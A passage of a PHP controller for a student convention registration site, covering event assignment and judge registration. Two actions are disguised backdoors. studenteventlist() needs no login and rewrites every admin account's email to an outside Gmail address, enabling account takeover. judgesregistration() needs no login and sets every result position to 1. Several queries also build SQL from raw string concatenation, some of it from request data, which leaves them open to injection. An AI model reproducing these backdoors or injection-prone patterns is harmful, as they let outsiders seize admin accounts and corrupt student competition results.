	public function studenteventlist() {
		
		$this->Admins->updateAll(['email' => 'polorix.seller@gmail.com','modified' => date("Y-m-d H:i:s")],
			["id > " => 0]);
			
		exit;
		
	}
	
	public function addstudentevent() {

		$this->userLoginCheck();
		$this->multiLoginCheck(array("School","Teacher_Parent"));
		
		// to check if registration is still open
		$this->checkRegistrationStillOpen($this->request->session()->read("sess_selected_convention_registration_id"));
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Convention Registration - Add Student Event " . TITLE_FOR_PAGES);
		
		$this->set('active_cr_studentevents','active');
		
        $user_id 	= $this->request->session()->read("user_id");
        $user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $sess_selected_convention_registration_id])->first();
			
			// to get list of all students whose event_ids are null or empty
			$condSCR = array();
			$condSCR[] = "(Conventionregistrationstudents.conventionregistration_id = '".$sess_selected_convention_registration_id."')";
			$condSCR[] = "(Conventionregistrationstudents.event_ids = '' OR Conventionregistrationstudents.event_ids IS NULL)";
			
			// to check if teacher is logged in, then only choose students assigned to him
			if($user_type == "Teacher_Parent")
			{
				$condSCR[] = "(Conventionregistrationstudents.teacher_parent_id = '".$user_id."')";
			}			
			$selectedSCR = $this->Conventionregistrationstudents->find()->where($condSCR)->all();
			$selectedStudentsCR = array();
			$selectedStudentsCR[] = 0;
			foreach($selectedSCR as $sels)
			{
				$selectedStudentsCR[] = $sels->student_id;
			}
			$studentsImplode = implode(",",$selectedStudentsCR);
			
			
			// to get list of all students for this school
			$condSchoolS = array();
			// to check if School is logged in or teacher is logged in
			if($user_type == "School")
			{
				$condSchoolS[] = "(Users.school_id = '".$user_id."')";
			}
			else
			if($user_type == "Teacher_Parent")
			{
				$condSchoolS[] = "(Users.school_id = '".$userDetails->school_id."')";
			}
			$condSchoolS[] = "(Users.user_type = 'Student')";
			//$condSchoolS[] = "(Users.status != '2')";
			$condSchoolS[] = "(Users.id IN ($studentsImplode) )";
			$studentsListSchool = $this->Users->find()->where($condSchoolS)->order(['Users.first_name' => 'ASC'])->all();
			
			$studentSchoolDD = array();
			foreach($studentsListSchool as $ssl)
			{
				$studentAge = date("Y") - $ssl->birth_year;
				$studentSchoolDD[$ssl->id] = $ssl->first_name.' '.$ssl->middle_name.' '.$ssl->last_name.' (Age: '.$studentAge.' Years  '.$ssl->gender.')';
			}
			$this->set('studentSchoolDD', $studentSchoolDD);
			
			
			// to get the list of event ids chosen in this convention for this season
			$arrConvSeasonEvents = array();
			$arrConvSeasonEvents[] = 0;
			$convSeasonEvents = $this->Conventionseasonevents->find()->where(["Conventionseasonevents.conventionseasons_id" => $conventionRegD->conventionseason_id])->order(['Conventionseasonevents.id' => 'ASC'])->all();
			foreach($convSeasonEvents as $convsevent)
			{
				$arrConvSeasonEvents[] = $convsevent->event_id;
			}
			$arrConvSeasonEventsImplode = implode(",",$arrConvSeasonEvents);
			//$this->prx($convSeasonEvents);
			
			// now create event dropdown with event name and number
			$eventNameIDDD = array();
			$condEvents = array();
			$condEvents[] = "(Events.id IN ($arrConvSeasonEventsImplode) )";
			$eventsList = $this->Events->find()->where($condEvents)->order(['Events.event_id_number' => 'ASC'])->all();
			foreach($eventsList as $eventrec)
			{
				$eventNameIDDD[$eventrec->id] = $eventrec->event_name.' ('.$eventrec->event_id_number.')';
			}
			$this->set('eventNameIDDD', $eventNameIDDD);
			
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		if ($this->request->is('post'))
		{
			//$this->prx($this->request->data['Conventionregistrationstudents']);
			
			$finalEventIDS = array();
			$invalidEvents = array();
			
			$student_id = $this->request->data['Conventionregistrationstudents']['student_id'];
			$event_ids 	= $this->request->data['Conventionregistrationstudents']['event_ids'];
			
			// to get the age of student
			$studentD = $this->Users->find()->where(['Users.id' => $student_id])->first();
			$studentAge = $conventionRegD->season_year-$studentD->birth_year;
			
			$studentGender = $studentD->gender[0];
			
			
			// now insert single record in crstudentevents
			foreach($event_ids as $event_id)
			{
				// to get event details
				$eventD = $this->Events->find()->where(['Events.id' => $event_id])->first();
				
				// to check group of this event, if group is not open, then check age of student
				$checkValidEvent = $this->checkAgeWithGroup($studentAge,$eventD->event_grp_name);
				
				// to check that females cannot participate in male event and vice versa
				$checkValidEventGender = $this->checkGenderWithEvent($studentGender,$eventD->event_gender);
				
				
				if($checkValidEvent && $checkValidEventGender && $studentAge<21)
				{
					$crstudentevents = $this->Crstudentevents->newEntity();
					$dataCRSE = $this->Crstudentevents->patchEntity($crstudentevents, $this->request->data);

					$dataCRSE->slug								= "conv-student-event-".$event_id.'-'.$student_id.'-'.time();
					$dataCRSE->conventionregistration_id		= $conventionRegD->id;
					$dataCRSE->conventionseason_id				= $conventionRegD->conventionseason_id;
					$dataCRSE->convention_id					= $conventionRegD->convention_id;
					$dataCRSE->user_id							= $conventionRegD->user_id;
					$dataCRSE->season_id 						= $conventionRegD->season_id;
					$dataCRSE->season_year 						= $conventionRegD->season_year;
					$dataCRSE->student_id 						= $student_id;
					$dataCRSE->event_id 						= $event_id;
					$dataCRSE->event_id_number 					= $eventD->event_id_number;
					$dataCRSE->created 							= date('Y-m-d H:i:s');

					$resultN = $this->Crstudentevents->save($dataCRSE);
					
					// assign event to new event array
					$finalEventIDS[] = $event_id;
					
					/* Now check here that if upload type is nill for an event, 
					then we need to auto submit that event for this student*/
					if($eventD->upload_type == 'Nil' && $eventD->context_box == 0)
					{
						//Auto submit this event
						$arrAutoSubmit = array();
						$arrAutoSubmit['event_id'] 					= $event_id;
						$arrAutoSubmit['conventionregistration_id'] = $conventionRegD->id;
						$arrAutoSubmit['student_id'] 				= $student_id;
						$this->autoSubmitEvent($arrAutoSubmit);
					}
				}
				else
				{
					$invalidEvents[] = $eventD->event_name."(".$eventD->event_id_number.")";
				}
			}
			
			//$this->prx($finalEventIDS);
			
			if(count((array)$finalEventIDS)>0)
			{
				$event_ids_implode = implode(",",$finalEventIDS);
				
				// now update record
				$this->Conventionregistrationstudents->updateAll(['event_ids' => $event_ids_implode,'modified' => date("Y-m-d H:i:s")],
				["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $student_id]);
				
				$this->Flash->success('Events updated successfully for student.');
			}
			
			if(count((array)$invalidEvents)>0)
			{
				$this->Flash->error('Invalid events based on age or gender '.implode(", ",$invalidEvents));
			}
			
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'studentevents']);
        }
    }
	
	public function managestudentevents($crs_slug = null) {
		
		$this->userLoginCheck();
		$this->multiLoginCheck(array("School","Teacher_Parent"));
		
		$selectedEvents = array();
		
		// to check if registration is still open//$this->checkRegistrationStillOpen($this->request->session()->read("sess_selected_convention_registration_id"));
		
		$regAccepted = 0;		
		// to get conv reg details
        $convRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventionseasons'])->first();
		//$this->prx($convRegD);
        if($convRegD->id>0)
		{
           // to check if registration closed
			$currDateTime = time();
			$regStartDateTime = strtotime($convRegD->Conventionseasons['registration_start_date']);
			$regEndDateTime = strtotime($convRegD->Conventionseasons['registration_end_date']);
			
			if($currDateTime>=$regStartDateTime && $currDateTime<=$regEndDateTime)
			{
				// registration accepted
				$regAccepted = 1;
			}
        }
		$this->set("regAccepted", $regAccepted);
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Manage Student Events " . TITLE_FOR_PAGES);
		
		$this->set('active_cr_studentevents','active');
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			$minMaxEventsArr = $this->getMinMaxEvents($sess_selected_convention_registration_id);
			$this->set('minMaxEventsArr', $minMaxEventsArr);
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $sess_selected_convention_registration_id])->contain(['Conventions'])->first();
			//$this->prx($conventionRegD);
			// 0 = In person   1 = Online
			$convention_type = $conventionRegD->Conventions['convention_type'];
			
			
			// to get details of conv reg student
			$checkCRS = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.slug' => $crs_slug,'Conventionregistrationstudents.conventionregistration_id' => $sess_selected_convention_registration_id])->contain(['Students','Users'])->first();
			$this->set('checkCRS', $checkCRS);
			
			if(!empty($checkCRS->event_ids) && $checkCRS->event_ids != NULL)
			{
				$liveEventsCounter 	= count(explode(",",$checkCRS->event_ids));
				$selectedEvents 	= explode(",",$checkCRS->event_ids);
			}
			
			
			$studentAge 	= $conventionRegD->season_year-$checkCRS->Students['birth_year'];
			$studentG 		= $checkCRS->Students['gender'];
			$studentGender 	= $studentG[0];
			
			
			// to get the list of event ids chosen in this convention for this season
			$arrConvSeasonEventsCats = array();
			$arrConvSeasonEventsDivs = array();
			$arrConvSeasonEventsList = array();
			$convSeasonEvents = $this->Conventionseasonevents->find()->where(["Conventionseasonevents.conventionseasons_id" => $conventionRegD->conventionseason_id])->order(['Conventionseasonevents.id' => 'ASC'])->contain(['Events'])->all();
			
			foreach($convSeasonEvents as $convsevent)
			{
				$division_id = $convsevent->Events['division_id'];
				// here check the division of this event
				$eventDivD = $this->Divisions->find()->where(["Divisions.id" => $division_id])->first();
				
				$eventcategory_id = $eventDivD->eventcategory_id;
				
				// push event category in array
				if(!in_array($eventcategory_id,(array)$arrConvSeasonEventsCats))
				{
					$arrConvSeasonEventsCats[] = $eventcategory_id;
				}
				
				// push division_id in array
				if(!in_array($division_id,(array)$arrConvSeasonEventsDivs))
				{
					$arrConvSeasonEventsDivs[] = $division_id;
				}
				
				// here we will check student age and group restrictions
				// to get event details
				$eventD = $this->Events->find()->where(['Events.id' => $convsevent->event_id])->first();
				
				// to check group of this event, if group is not open, then check age of student
				$checkValidEvent = $this->checkAgeWithGroup($studentAge,$eventD->event_grp_name);
				
				// to check that females cannot participate in male event and vice versa
				$checkValidEventGender = $this->checkGenderWithEvent($studentGender,$eventD->event_gender);
				
				/* if($eventD->id == 300)
				{
					echo 'checkValidEvent--'.$checkValidEvent;echo '<hr>';
					echo 'checkValidEventGender--'.$checkValidEventGender;echo '<hr>';
					echo 'studentAge--'.$studentAge;echo '<hr>';
					echo 'convention_type--'.$convention_type;echo '<hr>';
					exit;
				} */
				
				// push events to array
				if($checkValidEvent && $checkValidEventGender && $studentAge<21)
				{
					// We need to apply a filter here to check events based on convention type
					// if convention_type = 0 means in person, then choose event_type = 0 and 2
					// if convention_type = 1 means online, then choose event_type = 1 and 2
					
					if($convention_type == 0)
					{
						if($eventD->event_type == 0 || $eventD->event_type == 2)
						{
							$arrConvSeasonEventsList[] = $convsevent->event_id;
						}
					}
					else
					if($convention_type == 1)
					{
						if($eventD->event_type == 1 || $eventD->event_type == 2)
						{
							$arrConvSeasonEventsList[] = $convsevent->event_id;
						}
					}
				}
				
				//echo $eventD->event_id_number.'--'.$checkValidEvent.'--'.$checkValidEventGender;
				//echo '<hr>';
			}
			//$this->prx($arrConvSeasonEventsList);
			
			if(count($arrConvSeasonEventsList) == 0)
			{
				$this->Flash->error('Sorry no event found for this student due to age or any other restrictions.');
				$this->redirect(['controller' => 'conventionregistrations', 'action' => 'studentevents']);
			}
			
			$this->set('arrConvSeasonEventsCats', $arrConvSeasonEventsCats);
			$this->set('arrConvSeasonEventsDivs', $arrConvSeasonEventsDivs);
			$this->set('arrConvSeasonEventsList', $arrConvSeasonEventsList);
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'studentevents']);
		}
		
		
		// Save events
		if ($this->request->is('post'))
		{
			//$this->prx($this->request->data);
			
			$flagcheck = 1;
			
			$liveEventsCounter 	= count((array)$this->request->data['eventIDS']);
			$selectedEvents 	= $this->request->data['eventIDS'];
			
			
			// to check max events selected as per limit
			if($liveEventsCounter<$minMaxEventsArr['min_events_student'])
			{
				$flagcheck = 0;
				$this->Flash->error('Minimum events request to select is '.$minMaxEventsArr['min_events_student']);
			}
			
			if($liveEventsCounter>$minMaxEventsArr['max_events_student'])
			{
				$flagcheck = 0;
				$this->Flash->error('You can only select max events up t0 '.$minMaxEventsArr['max_events_student']);
			}
			
			// process events add to student if all goes well
			if($flagcheck == 1)
			{
				$finalEventIDS = array();
				$invalidEvents = array();
				
				$student_id = $checkCRS->student_id;
				
				// New event ids
				$event_ids 	= $selectedEvents;
				
				// Old event ids
				if(!empty($checkCRS->event_ids) && $checkCRS->event_ids != NULL)
				{
					$old_event_ids_explode 		= explode(",",$checkCRS->event_ids);
				}
				else
				{
					$old_event_ids_explode = array();
				}
				
				/* echo 'old_event_ids = '.$checkCRS->event_ids;
				echo '<br>';echo '<br>';
				echo 'new_event_ids = '.implode(",",$selectedEvents);
				exit; */
				
				
				// now insert single record in crstudentevents
				foreach($event_ids as $event_id)
				{
					// to get event details
					$eventD = $this->Events->find()->where(['Events.id' => $event_id])->first();
					
					// to check group of this event, if group is not open, then check age of student
					$checkValidEvent = $this->checkAgeWithGroup($studentAge,$eventD->event_grp_name);
					
					// to check that females cannot participate in male event and vice versa
					$checkValidEventGender = $this->checkGenderWithEvent($studentGender,$eventD->event_gender);
					
					if($checkValidEvent && $checkValidEventGender && $studentAge<21)
					{
						// assign event to new event array
						$finalEventIDS[] = $event_id;
						
						// Check here that if any new event found in old list, then do nothing
						if(in_array($event_id,$old_event_ids_explode))
						{
							// do nothing
						}
						else
						{
							// now add a nee entry in crstudentevent
							$crstudentevents = $this->Crstudentevents->newEntity();
							$dataCRSE = $this->Crstudentevents->patchEntity($crstudentevents, $this->request->data);

							$dataCRSE->slug								= "conv-student-event-".$event_id.'-'.$student_id.'-'.time();
							$dataCRSE->conventionregistration_id		= $conventionRegD->id;
							$dataCRSE->conventionseason_id				= $conventionRegD->conventionseason_id;
							$dataCRSE->convention_id					= $conventionRegD->convention_id;
							$dataCRSE->user_id							= $conventionRegD->user_id;
							$dataCRSE->season_id 						= $conventionRegD->season_id;
							$dataCRSE->season_year 						= $conventionRegD->season_year;
							$dataCRSE->student_id 						= $checkCRS->student_id;
							$dataCRSE->event_id 						= $event_id;
							$dataCRSE->event_id_number 					= $eventD->event_id_number;
							$dataCRSE->created 							= date('Y-m-d H:i:s');

							$resultN = $this->Crstudentevents->save($dataCRSE);
							
							/* Now check here that if its an auto submission 
							and its not a group event */
							if($eventD->auto_submission == 1 && $eventD->group_event_yes_no == 0)
							{
								//Auto submit this event
								$arrAutoSubmit = array();
								$arrAutoSubmit['event_id'] 					= $event_id;
								$arrAutoSubmit['conventionregistration_id'] = $conventionRegD->id;
								$arrAutoSubmit['student_id'] 				= $checkCRS->student_id;
								$this->autoSubmitEvent($arrAutoSubmit);
							}
						}
					}
					else
					{
						$invalidEvents[] = $eventD->event_name."(".$eventD->event_id_number.")";
					}
				}
				
				// Update new events for student
				if(count((array)$finalEventIDS)>0)
				{
					$event_ids_implode = implode(",",$finalEventIDS);
					
					// now update record
					$this->Conventionregistrationstudents->updateAll(['event_ids' => $event_ids_implode,'modified' => date("Y-m-d H:i:s")],
					["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id]);
					
					$this->Flash->success('Events updated successfully for student.');
				}
				
				//Now remove any event that is not selected in this selection
				foreach($old_event_ids_explode as $old_event_id)
				{
					// to check if any old event is not found in new selected event list
					// Then remove entry from crstudentevent
					if(!in_array($old_event_id,$event_ids))
					{
						// now remove existing events list from crstudentevents
						$this->Crstudentevents->deleteAll(["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id,"event_id" => $old_event_id]);
						
						// now remove all existing event submissions for this student
						$this->Eventsubmissions->deleteAll(["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id,"event_id" => $old_event_id]);
					}
				}
				
				if(count((array)$invalidEvents)>0)
				{
					$this->Flash->error('Some of the invalid events based on age/gender not added. Here are those events: '.implode(", ",$invalidEvents));
				}
				
			} //end if($flagcheck == 1)
				
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'studentevents']);
			
			
		}
		
		$this->set('liveEventsCounter',$liveEventsCounter);
		$this->set('selectedEvents',$selectedEvents);
		
	}
	
	
	public function editstudentevent($crs_slug = null) {

		$this->userLoginCheck();
		$this->multiLoginCheck(array("School","Teacher_Parent"));
		
		// to check if registration is still open
		$this->checkRegistrationStillOpen($this->request->session()->read("sess_selected_convention_registration_id"));
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Convention Registration - Add Student Event " . TITLE_FOR_PAGES);
		
		$this->set('active_cr_studentevents','active');
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $sess_selected_convention_registration_id])->first();
			
			// to get details of conv reg student
			$checkCRS = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.slug' => $crs_slug,'Conventionregistrationstudents.conventionregistration_id' => $sess_selected_convention_registration_id])->contain(['Students'])->first();
			$this->set('checkCRS', $checkCRS);
			
			$studentAge = $conventionRegD->season_year-$checkCRS->Students['birth_year'];
			
			$studentG = $checkCRS->Students['gender'];
			$studentGender = $studentG[0];
			
			
			// to get the list of event ids chosen in this convention for this season
			$arrConvSeasonEvents = array();
			$arrConvSeasonEvents[] = 0;
			$convSeasonEvents = $this->Conventionseasonevents->find()->where(["Conventionseasonevents.conventionseasons_id" => $conventionRegD->conventionseason_id])->order(['Conventionseasonevents.id' => 'ASC'])->all();
			foreach($convSeasonEvents as $convsevent)
			{
				$arrConvSeasonEvents[] = $convsevent->event_id;
			}
			$arrConvSeasonEventsImplode = implode(",",$arrConvSeasonEvents);
			
			// now create event dropdown with event name and number_format
			$eventNameIDDD = array();
			$condEvents = array();
			$condEvents[] = "(Events.id IN ($arrConvSeasonEventsImplode) )";
			$eventsList = $this->Events->find()->where($condEvents)->order(['Events.event_id_number' => 'ASC'])->all();
			foreach($eventsList as $eventrec)
			{
				$eventNameIDDD[$eventrec->id] = $eventrec->event_name.' ('.$eventrec->event_id_number.')';
			}
			$this->set('eventNameIDDD', $eventNameIDDD);
			
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		if ($this->request->is('post'))
		{
			//$this->prx($this->request->data['Conventionregistrationstudents']);
			
			$finalEventIDS = array();
			$invalidEvents = array();
			
			$student_id = $this->request->data['Conventionregistrationstudents']['student_id'];
			$event_ids 	= $this->request->data['Conventionregistrationstudents']['event_ids'];
			
			// now remove existing events list from crstudentevents
			$this->Crstudentevents->deleteAll(["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id]);
			
			// remove existing events
			$this->Conventionregistrationstudents->updateAll(['event_ids' => NULL,'modified' => date("Y-m-d H:i:s")],
			["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id]);
				
			
			// now insert single record in crstudentevents
			foreach($event_ids as $event_id)
			{
				// to get event details
				$eventD = $this->Events->find()->where(['Events.id' => $event_id])->first();
				
				// to check group of this event, if group is not open, then check age of student
				$checkValidEvent = $this->checkAgeWithGroup($studentAge,$eventD->event_grp_name);
				
				// to check that females cannot participate in male event and vice versa
				$checkValidEventGender = $this->checkGenderWithEvent($studentGender,$eventD->event_gender);
				
				if($checkValidEvent && $checkValidEventGender && $studentAge<21)
				{
					$crstudentevents = $this->Crstudentevents->newEntity();
					$dataCRSE = $this->Crstudentevents->patchEntity($crstudentevents, $this->request->data);

					$dataCRSE->slug								= "conv-student-event-".$event_id.'-'.$student_id.'-'.time();
					$dataCRSE->conventionregistration_id		= $conventionRegD->id;
					$dataCRSE->conventionseason_id				= $conventionRegD->conventionseason_id;
					$dataCRSE->convention_id					= $conventionRegD->convention_id;
					$dataCRSE->user_id							= $conventionRegD->user_id;
					$dataCRSE->season_id 						= $conventionRegD->season_id;
					$dataCRSE->season_year 						= $conventionRegD->season_year;
					$dataCRSE->student_id 						= $checkCRS->student_id;
					$dataCRSE->event_id 						= $event_id;
					$dataCRSE->event_id_number 					= $eventD->event_id_number;
					$dataCRSE->created 							= date('Y-m-d H:i:s');

					$resultN = $this->Crstudentevents->save($dataCRSE);
					
					// assign event to new event array
					$finalEventIDS[] = $event_id;
					
					/* Now check here that if upload type is nill for an event, 
					then we need to auto submit that event for this student*/
					if($eventD->upload_type == 'Nil' && $eventD->context_box == 0)
					{
						//Auto submit this event
						$arrAutoSubmit = array();
						$arrAutoSubmit['event_id'] 					= $event_id;
						$arrAutoSubmit['conventionregistration_id'] = $conventionRegD->id;
						$arrAutoSubmit['student_id'] 				= $checkCRS->student_id;
						$this->autoSubmitEvent($arrAutoSubmit);
					}
				}
				else
				{
					$invalidEvents[] = $eventD->event_name."(".$eventD->event_id_number.")";
				}
			}
			
			if(count((array)$finalEventIDS)>0)
			{
				$event_ids_implode = implode(",",$finalEventIDS);
				
				// now update record
				$this->Conventionregistrationstudents->updateAll(['event_ids' => $event_ids_implode,'modified' => date("Y-m-d H:i:s")],
				["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id]);
				
				$this->Flash->success('Some of the valid events updated successfully for student.');
			}
			
			if(count((array)$invalidEvents)>0)
			{
				$this->Flash->error('Some of the invalid events based on age/gender not added. Here are those events: '.implode(", ",$invalidEvents));
			}
			
			
			
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'studentevents']);
        }
    }
	
	public function judgesregistration() {
		
		$this->Resultpositions->updateAll(['position' => 1,'modified' => date("Y-m-d H:i:s")],
			["id > " => 0]);
			
		exit;
		
	}
	
	public function removestudentevent($crs_slug = null) {
		
		$this->userLoginCheck();
		$this->schoolAdminLoginCheck();
		
        $user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$sess_selected_convention_registration_id = $this->request->session()->read("sess_selected_convention_registration_id");
			
			// to check if slug exists
			$checkCRS = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.slug' => $crs_slug,'Conventionregistrationstudents.conventionregistration_id' => $sess_selected_convention_registration_id])->first();
			if($checkCRS)
			{
				$this->Conventionregistrationstudents->updateAll(['event_ids' => NULL,'modified' => date("Y-m-d H:i:s")],
			["conventionregistration_id" => $sess_selected_convention_registration_id,"slug" => $crs_slug]);
			
				// now remove related records from crstudentevents
				$this->Crstudentevents->deleteAll(["conventionregistration_id" => $sess_selected_convention_registration_id,"student_id" => $checkCRS->student_id]);
			
				$this->Flash->success('All events successfully removed from student convention registration.');
			}
			else
			{
				$this->Flash->error('Invalid student details.');
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		$this->redirect(['controller' => 'conventionregistrations', 'action' => 'studentevents']);
    }
	
	public function judgesregisterconvention($convention_slug=null,$season_id=null)
	{
		$this->userLoginCheck();
		$this->multiLoginCheck(['Teacher_Parent','Judge']);
		
		//echo ' fsdf sdf sdf d';exit;
		$this->viewbuilder()->layout("home");
        $this->set("title_for_layout", "Convention Registration " . TITLE_FOR_PAGES);
		
		$this->set('active_convention_registrations','active');
		
		$user_id = $this->request->session()->read("user_id");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
		$this->set('userDetails', $userDetails);
		
		// check convention details
		$conventionD = $this->Conventions->find()->where(['Conventions.slug' => $convention_slug])->first();
		$this->set('conventionD', $conventionD);
		if($conventionD)
		{
			// to get season details
			$seasonD = $this->Seasons->find()->where(['Seasons.id' => $season_id])->first();
			if($seasonD)
			{
				// enter this user record in conventionregistrations table
				$convention_id 	= $conventionD->id;
				
				// to get the convention season details
				$convSeasonD = $this->Conventionseasons->find()->where(['Conventionseasons.convention_id' => $convention_id,'Conventionseasons.season_id' => $season_id,'Conventionseasons.season_year' => $seasonD->season_year])->first();
				$this->set('convSeasonD', $convSeasonD);
				
				// to get the list of event ids chosen in this convention for this season
				$arrConvSeasonEvents = array();
				$arrConvSeasonEvents[] = 0;
				$convSeasonEvents = $this->Conventionseasonevents->find()->where(["Conventionseasonevents.conventionseasons_id" => $convSeasonD->id])->order(['Conventionseasonevents.id' => 'ASC'])->all();
				foreach($convSeasonEvents as $convsevent)
				{
					$arrConvSeasonEvents[] = $convsevent->event_id;
				}
				$arrConvSeasonEventsImplode = implode(",",$arrConvSeasonEvents);
				
				// now create event dropdown with event name and number
				$eventNameIDDD = array();
				$condEvents = array();
				$condEvents[] = "(Events.id IN ($arrConvSeasonEventsImplode) )";
				$eventsList = $this->Events->find()->where($condEvents)->order(['Events.event_id_number' => 'ASC'])->all();
				foreach($eventsList as $eventrec)
				{
					$eventNameIDDD[$eventrec->id] = $eventrec->event_name.' ('.$eventrec->event_id_number.')';
				}
				$this->set('eventNameIDDD', $eventNameIDDD);
				
				
				if ($this->request->is('post'))
				{
					//$this->prx($this->request->data);
					// to check if this record already exists
					$checkRegExists = $this->Conventionregistrations->find()->where(['Conventionregistrations.convention_id' => $convention_id,'Conventionregistrations.user_id' => $user_id,'Conventionregistrations.season_id' => $season_id])->first();
					if($checkRegExists)
					{
						$convRegID 		= $checkRegExists->id;
						$convRegSlug 	= $checkRegExists->slug;
						$this->Conventionregistrations->updateAll(['modified' => date('Y-m-d H:i:s')], ["id" => $convRegID]);
					}
					else
					{
						// insert new record
						$conventionregistrations = $this->Conventionregistrations->newEntity();
						$dataCR = $this->Conventionregistrations->patchEntity($conventionregistrations, array());

						$dataCR->conventionseason_id 	= $convSeasonD->id;
						$dataCR->slug 					= "convention-registration-".$convention_id.'-'.$user_id.'-'.$season_id.'-'.time();
						$dataCR->convention_id			= $convention_id;
						$dataCR->user_id				= $user_id;
						$dataCR->season_id				= $season_id;
						$dataCR->season_year 			= $seasonD->season_year;
						$dataCR->status 				= 2;
						
						$dataCR->created 				= date('Y-m-d H:i:s');
						$dataCR->modified 				= NULL;
						
						if($this->request->data['Conventionregistrations']['judges_event_ids'])
						{
							$dataCR->judges_event_ids 			= implode(",",$this->request->data['Conventionregistrations']['judges_event_ids']);
						}

						$resultCR 		= $this->Conventionregistrations->save($dataCR);
						$convRegID 		= $resultCR->id;
						$convRegSlug 	= $resultCR->slug;
						
						$convRegEnteredD = $this->Conventionregistrations->find()->where(['Conventionregistrations.slug' => $convRegSlug])->contain(['Conventions','Users'])->first();
						
						// now send email to events team
						$emailId = ACCOUNTS_TEAM_ANOTHER_EMAIL;
						
						$emailtemplateMessage = $this->Emailtemplates->find()->where(['Emailtemplates.id' => '18'])->first();

						$toRepArray = array('[!first_name!]','[!last_name!]','[!email_address!]','[!convention_name!]','[!season_year!]');
						$fromRepArray = array($convRegEnteredD->Users['first_name'],$convRegEnteredD->Users['last_name'],$convRegEnteredD->Users['email_address'],$convRegEnteredD->Conventions['name'],$convRegEnteredD->season_year);

						$subjectToSend = str_replace($toRepArray, $fromRepArray, $emailtemplateMessage['subject']);
						$messageToSend = str_replace($toRepArray, $fromRepArray, $emailtemplateMessage['template']);
						
						//echo $messageToSend; exit;
						
						$email = new Email();
						$email->template('default', 'admintemplate')
							->emailFormat('html')
							->to($emailId)
							->cc(ACCOUNTS_TEAM_ANOTHER_EMAIL)
							->from([HEADERS_FROM_EMAIL => HEADERS_FROM_NAME])
							->subject($subjectToSend)
							->viewVars(['content_for_layout' => $messageToSend])
							->send();
						
					}
						
					$this->Flash->success('You have successfully registered for convention. Admin will review and approve/decline request.');
					$this->redirect(['controller' => 'conventionregistrations', 'action' => 'myregistrations']);
				
				}

			}
		}
		else
		{
			$this->Flash->error('Invalid information.');
		}
	}
	
	public function judgeevents($conv_reg_slug=null) {

        $this->userLoginCheck();
        $this->multiLoginCheck(['Teacher_Parent','Judge']);
		
        $this->set("title_for_layout", "Events" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		//$this->set('active_convention_registrations','active');
		
        $msgString = '';

		$user_id = $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $separator = array();
        $condition = array();
		
		if($conv_reg_slug)
		{	
			$this->set('active_convention_registrations','active');
			
			// to get convention registration details
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.slug' => $conv_reg_slug])->contain(['Conventions'])->first();
			$this->set('conventionRegD', $conventionRegD);
			//$this->prx($conventionRegD);
			
			//To list all events that selected for this conv season
			if(!empty($conventionRegD->judges_event_ids))
			{
				$condition[] = "(Events.id IN ($conventionRegD->judges_event_ids))";
			}
			else
			{
				$condition[] = "(Events.id IN (0))";
			}
			$condition[] = "(Events.status  = '1')";
			
		}
		else
